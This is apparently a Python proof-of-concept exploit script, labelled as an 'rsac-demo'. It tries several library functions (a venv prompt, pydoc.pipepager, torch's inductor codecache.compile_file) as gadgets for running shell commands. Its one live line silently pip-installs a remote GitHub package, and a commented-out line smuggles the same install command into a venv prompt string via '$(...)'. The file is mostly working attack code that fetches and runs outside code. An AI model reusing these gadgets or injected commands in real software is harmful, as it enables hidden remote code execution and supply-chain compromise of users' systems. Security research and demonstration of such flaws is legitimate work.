import pydoc
import sys
import types
import venv
from webbrowser import GenericBrowser

import virtualenv



# venv.create('exploit', with_pip=True, prompt="$(pip install git+https://github.com/madgetr/rsac-demo-package --no-input -q -q -q && echo hello)")
# venv.main('--upgrade-deps')
#
# virtualenv.run.cli_run(['exploit'])

# context = types.SimpleNamespace()
# context.env_exec_cmd = "exploit/bin/activate"
# context.bin_path = sys.executable
# context.env_dir = "exploit"
# envBuilder = venv.EnvBuilder()
# pydoc.pipepager('help','python -m pip install git+https://github.com/madgetr/rsac-demo-package  -q -q -q --no-input --exists-action i --isolated')
# # venv.CORE_VENV_DEPS = ['git+https://github.com/madgetr/rsac-demo-package']
# envBuilder.upgrade_dependencies(context)

import torch._inductor.codecache as codecache
codecache.compile_file('/dev/null','/dev/null', ['python', '-m', 'pip', 'install', 'git+https://github.com/madgetr/rsac-demo-package',  '-q', '-q', '-q', '--no-input', '--exists-action', 'i', '--isolated'])
# object_methods = [method_name for method_name in dir(codecache)
#                   if callable(getattr(codecache, method_name))]
# codecache.compile_file('','', ['echo', 'hello'])
